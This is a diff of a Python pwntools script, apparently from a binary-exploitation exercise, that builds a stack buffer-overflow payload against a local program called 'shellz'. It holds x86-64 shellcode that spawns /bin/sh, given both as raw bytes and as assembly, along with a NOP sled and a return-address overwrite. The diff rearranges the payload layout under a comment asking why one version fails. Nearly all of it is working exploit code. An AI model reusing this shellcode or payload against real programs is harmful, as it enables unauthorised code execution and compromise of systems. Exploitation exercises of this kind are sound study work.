@@ -6,8 +6,21 @@ from ctypes import CDLL, c_uint, c_int, byref
 PROGRAM_PATH = (Path(__file__).parent / "shellz").resolve().__str__()
 BUFF_SIZE = 8192 + 8  # 0x2000
 SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
-Shellcode2 = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
+# Shellcode2 = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
+context.arch = "amd64"
 
+binsh = u64(b"/bin/sh\x00")
+myShellCode = f"""
+    mov rbx, {binsh}
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 0x3b
+    push rbx
+    mov rdi, rsp
+    syscall
+"""
+
+# SHELL_CODE = asm(myShellCode)
 PAYLOAD_SIZE = len(SHELL_CODE)
 WRAP_AROUND = 500
 
@@ -101,22 +114,23 @@ print(f"buffer address hex: {buffer_addr}")
 MODULO = 500
 NOP_SLED_SIZE = 532  # 16 byte aligned!
 NOP_SIZE = NOP_SLED_SIZE + byte_align + 5
-# Byte align the shellcode
 NOP = b"\x90"
-payload = (
-    NOP * (BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)
-    + SHELL_CODE
-    + NOP * (NOP_SIZE)
-    + p64(int_stack_addr, endianness="little")
-)
 
-# TODO: WHY DOES THIS NOT WORK
+# Byte align the shellcode
 # payload = (
 #     NOP * (BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)
-#     + NOP * (NOP_SIZE)
 #     + SHELL_CODE
+#     + NOP * (NOP_SIZE)
 #     + p64(int_stack_addr, endianness="little")
 # )
+
+# TODO: WHY DOES THIS NOT WORK
+payload = (
+    NOP * (BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)
+    + NOP * (NOP_SIZE)
+    + SHELL_CODE
+    + p64(int_stack_addr, endianness="little")
+)
 
 # print(f"Payload is: {payload}")
 print(f"Payload len is: {len(payload)}")
